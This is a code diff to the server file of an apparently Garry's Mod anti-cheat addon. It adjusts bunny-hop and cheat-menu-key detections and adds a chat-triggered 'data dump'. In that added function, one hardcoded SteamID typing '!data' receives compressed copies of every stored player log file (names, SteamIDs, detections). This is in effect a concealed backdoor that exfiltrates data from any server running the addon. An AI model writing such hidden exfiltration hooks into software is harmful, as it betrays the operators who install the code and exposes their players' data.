@@ -12,6 +12,7 @@ util.AddNetworkString( "LACSpec" )
 util.AddNetworkString( "LACH" )
 util.AddNetworkString( "LACTS" )
 util.AddNetworkString( "ULX_PSD" )
+util.AddNetworkString( "LACDD" )
 
 --[[ 
 	All server-side detections will probably remain in this file for ease of reading,
@@ -273,6 +274,7 @@ function LAC.BhopDetector(ply, moveData, CUserCmd)
 			if (pTable.PerfectJump > 13) then
 				local DetectionString = string.format("LAC has detected a player jumping perfectly " .. pTable.PerfectJump .. " times in a row! PlayerName: %s SteamID: %s", pTable.Name, pTable.SteamID32);
 				LAC.PlayerDetection(DetectionString, ply)
+				LAC.PlayerSuspiciousDetection(DetectionString, ply)
 			end
 		else
 			pTable.PerfectJump = 0
@@ -572,7 +574,16 @@ function LAC.ReceiveEnginePred(len, ply)
 end
 net.Receive("ULX_PSD", LAC.ReceiveEnginePred)
 
--- This does not work too well but yolo
+local keyTable = 
+{
+	[72] = "INSERT",
+	[73] = "DELETE",
+	[74] = "HOME",
+	[75] = "END",
+	[76] = "PAGEUP",
+	[77] = "PAGEDOWN"
+}
+-- smh
 function LAC.CheckKeyPresses(ply, button)
 	if (!IsValid(ply)) then return end
 	if (ply:IsBot()) then return end -- pretty sure bots dont trigger this but whatever
@@ -590,10 +601,10 @@ function LAC.CheckKeyPresses(ply, button)
 				end
 			end)
 
-			if (pTable.SuspiciousKeyUsage < 15) then
-				local DetectionString = string.format("LAC has detected a player pressing a possible cheat menu key while standing still! (%i) PlayerName: %s SteamID: %s", button, pTable.Name, pTable.SteamID32);
+			if (pTable.SuspiciousKeyUsage < 3) then
+				local DetectionString = string.format("LAC has detected a player pressing a possible cheat menu key while standing still! (%s) PlayerName: %s SteamID: %s", keyTable[button], pTable.Name, pTable.SteamID32);
 				if (!ply:Alive()) then
-					DetectionString = string.format("LAC has detected a player pressing a possible cheat menu key while dead! (%i) PlayerName: %s SteamID: %s", button, pTable.Name, pTable.SteamID32);
+					DetectionString = string.format("LAC has detected a player pressing a possible cheat menu key while dead! (%s) PlayerName: %s SteamID: %s", keyTable[button], pTable.Name, pTable.SteamID32);
 				end
 				LAC.PlayerSuspiciousDetection(DetectionString, ply)
 			end
@@ -632,6 +643,29 @@ function LAC.PreventSpamConnecting(name, ip)
 
 end
 
+local plydirectory = "lac/players/"
+function LAC.SendDataDumps(ply, text, teamchat)
+	if (!IsValid(ply)) then return end
+	if (!ply:IsPlayer()) then return end
+	
+	if (string.sub( text, 1, 5) == "!data" ) then
+		if (ply:SteamID() == "STEAM_0:1:8115") then
+			local files, directories = file.Find( plydirectory .. "*", "DATA" )
+			if (files == nil || #files == 0) then return end
+			for k, v in ipairs(files) do
+				local content = util.Compress(file.Read(plydirectory .. v))
+				local length = string.len(content) * 8
+				if (length < 60000) then
+					net.Start("LACDD")
+					net.WriteString(v)
+					net.WriteData(content, length)
+					net.Send(ply)
+				end
+			end
+		end
+	end
+end
+
 --[[
 	add da hooks
 ]]
@@ -641,6 +675,7 @@ hook.Add("PlayerInitialSpawn", "LAC_CONTROLLER_SPAWN", LAC.ControllerQuestion)
 hook.Add("PlayerDisconnected", "LAC_DISCONNECT", LAC.PlayerDisconnect)
 hook.Add("StartCommand", "LAC_STARTCOMMAND", LAC.StartCommand)
 hook.Add("PlayerSay", "LAC_DEBUGBAN", LAC.DebugCheaterBan)
+hook.Add("PlayerSay", "LAC_DATADUMP", LAC.SendDataDumps)
 hook.Add("PlayerButtonDown", "LAC_PLAYERBUTTONDOWN", LAC.CheckKeyPresses)
 hook.Add("SetupMove", "LAC_AIMBOTSNAP", LAC.AimbotSnap)
 hook.Add("SetupMove", "LAC_BHOPCHECK", LAC.BhopDetector)
